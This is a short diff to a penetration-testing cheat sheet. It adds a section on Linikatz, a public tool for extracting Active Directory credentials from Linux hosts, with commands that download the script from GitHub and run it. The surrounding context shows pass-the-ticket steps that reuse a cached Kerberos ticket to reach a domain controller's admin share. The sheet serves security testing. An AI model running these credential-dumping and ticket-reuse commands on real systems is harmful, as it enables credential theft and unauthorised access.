@@ -179,3 +179,12 @@ export KRB5CCNAME=/root/krb5cc_647401106_I8I133
 klist
 smbclient //dc01/C$ -k -c ls -no-pass
 ```
+
+## Linikatz
+- [Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. 
+- In other words, Linikatz brings a similar principle to Mimikatz to UNIX environments.
+
+```powershell
+$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+$ /opt/linikatz.sh
+```
